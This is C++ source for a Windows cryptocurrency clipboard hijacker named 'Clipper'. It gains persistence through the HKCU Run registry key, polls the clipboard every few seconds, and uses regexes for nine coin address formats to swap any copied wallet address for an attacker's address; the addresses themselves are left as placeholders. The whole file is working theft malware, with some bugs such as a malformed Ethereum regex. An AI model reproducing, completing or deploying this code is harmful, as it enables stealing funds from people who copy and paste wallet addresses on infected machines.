#include <string>
#include <atlstr.h>
#include <winuser.h>
#include <windows.h>
#include <regex>

#pragma comment(lib, "user32.lib")
#pragma warning(disable:4326)

using namespace std;

void Writebuffer(string&);
string Readbuffer();
void checkers(string& data);
void Reactor();
void autoranner();


string crypto = "";




void WINAPI main()
{
#pragma comment(linker, "/SYBSYSTEM:windows, /ENTRY:mainCRTStartup " )
	char MUTEX_NAME[] = "MUTEX_NAME";
	//FreeConsole();

	if (OpenMutex(MUTEX_ALL_ACCESS, 0, (LPCWSTR)MUTEX_NAME))
	{
		exit(EXIT_FAILURE);
	}
	CreateMutex(0, 0, (LPCWSTR)MUTEX_NAME);
	autoranner();
	while (true)
	{
		Reactor();
	}

}

void checkers(string& data)
{
	static string add_btc = "<заглушка>";
	static string add_eth1 = "<заглушка>";
	static string add_xmr = "<заглушка>";
	static string add_xlm = "<заглушка>";
	static string add_xrp = "<заглушка>";
	static string add_ltc = "<заглушка>";
	static string add_nec = "<заглушка>";
	static string add_bch = "<заглушка>";
	static string add_dash = "<заглушка>";
	static cmatch res;
	static regex btc("(?:^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}$)");
	static regex eth1("(?:^0x[a - fA - F0 - 9]{40}$)");
	static regex xmr("(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)");
	static regex xlm("(?:^G[0-9a-zA-Z]{55}$)");
	static regex xrp("(?:^r[0-9a-zA-Z]{24,34}$)");
	static regex ltc("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)");
	static regex nec("(?:^A[0-9a-zA-Z]{33}$)");
	static regex bch("^((bitcoincash:)?(q|p)[a-z0-9]{41})");
	static regex dash("(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)");
	static regex arr[9]{ btc, eth1, xmr, xlm, xrp, ltc, nec, bch, dash };
	static string arrav[9]{ add_btc ,add_eth1 ,add_xmr ,add_xlm, add_xrp, add_ltc, add_nec, add_bch, add_dash };
	for (int i=0; i < 9; i++)
	{
		bool g = regex_match(data.c_str(), res, arr[i]);
		crypto = arrav[i];
		if (g)
		{
			Writebuffer(crypto);

		}
	}
	
	

}

void autoranner()
{
	_TCHAR pathname[256] = _T("C:\\Users\\murza\\source\\repos\\Clipper\\x64\\Debug\\Clipper.exe");
	HKEY hg;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg);
	RegSetValueEx(hg, L"Clipper.exe", NULL, REG_SZ, (BYTE*)pathname, sizeof(pathname));
	RegCloseKey(hg);
}

void Reactor()
{
	if (IsClipboardFormatAvailable(CF_TEXT))
	{
		if (OpenClipboard(NULL))
		{

			Readbuffer();
			CloseClipboard();
		}
		Sleep(2000);
	}
	Sleep(2000);
}

string Readbuffer()
{
	if (OpenClipboard(NULL))
	{
		string data;
		HANDLE buffdata;
		char* chBuffer;
		buffdata = GetClipboardData(CF_TEXT);
		chBuffer = (char*)GlobalLock(buffdata);
		data = chBuffer;
		GlobalUnlock(buffdata);
		checkers(data);
		CloseClipboard();
		return data;

	}
}

void Writebuffer(string& crypto)
{
	if (OpenClipboard(NULL))
	{
		HGLOBAL buffer;
		char* chBuffer;
		EmptyClipboard();
		buffer = GlobalAlloc(GMEM_DDESHARE, crypto.size() + 1);
		chBuffer = (char*)GlobalLock(buffer);
		memcpy(GlobalLock(buffer), crypto.c_str(), crypto.size() + 1);
		GlobalUnlock(buffer);
		SetClipboardData(CF_TEXT, buffer);
		CloseClipboard();
		Sleep(2000);

	}
}